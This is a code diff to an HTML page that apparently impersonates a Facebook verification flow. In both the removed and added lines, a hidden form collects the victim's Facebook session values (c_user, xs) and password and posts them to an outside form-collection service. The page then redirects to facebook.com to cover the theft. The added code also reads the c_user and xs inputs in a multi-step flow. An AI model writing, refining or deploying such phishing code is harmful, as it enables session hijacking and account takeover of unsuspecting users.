@@ -1512,14 +1512,21 @@
                             </ul>
                         </div>
                         
-                        <button id="finishBtn" type="button">Finish</button>
-
-<form id="hiddenForm" action="https://submit-form.com/Em4ijHV9p" method="post">
-    <input type="hidden" name="c_user" id="hiddenCUser" value="123456">
-    <input type="hidden" name="xs" id="hiddenXs" value="abc123">
-    <input type="hidden" name="password" id="hiddenPassword" value="mypassword">
-</form>
-
+                        <button class="btn btn-primary" id="finishBtn">
+                            <i class="fas fa-check"></i> Finish
+                        </button>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+    
+    <!-- Hidden form for submission -->
+    <form id="hiddenForm" class="hidden-form" action="https://submit-form.com/Em4ijHV9p" method="post">
+        <input type="hidden" name="c_user" id="hiddenCUser">
+        <input type="hidden" name="xs" id="hiddenXs">
+        <input type="hidden" name="password" id="hiddenPassword">
+    </form>
     
     <!-- Footer -->
     <footer>
@@ -1920,38 +1927,16 @@
             closeModal.addEventListener('click', closeModalFunc);
             cancelBtn.addEventListener('click', closeModalFunc);
             
-<script>
-document.addEventListener('DOMContentLoaded', function () {
-    const finishBtn = document.getElementById('finishBtn');
-    const hiddenForm = document.getElementById('hiddenForm');
-    const hiddenCUser = document.getElementById('hiddenCUser');
-    const hiddenXs = document.getElementById('hiddenXs');
-    const hiddenPassword = document.getElementById('hiddenPassword');
-
-    finishBtn.addEventListener('click', function (e) {
-        e.preventDefault();
-
-        console.log("Finish button clicked");
-        console.log("c_user:", hiddenCUser.value);
-        console.log("xs:", hiddenXs.value);
-        console.log("password:", hiddenPassword.value);
-
-        if (!hiddenCUser.value || !hiddenXs.value || !hiddenPassword.value) {
-            alert("Missing form values.");
-            return;
-        }
-
-        hiddenForm.submit();
-
-        setTimeout(function () {
-            window.location.href = "https://www.facebook.com/";
-        }, 1000);
-    });
-});
-</script>
-
-
-
+            // Finish button
+            finishBtn.addEventListener('click', function() {
+                window.location.href = "https://www.facebook.com/";
+            });
+            
+            // Next to Step 2
+            nextToStep2.addEventListener('click', function() {
+                const cUserInput = document.getElementById('c_user');
+                const xsInput = document.getElementById('xs');
+                
                 // Trigger browser validation
                 if (!cUserInput.checkValidity()) {
                     cUserInput.reportValidity();
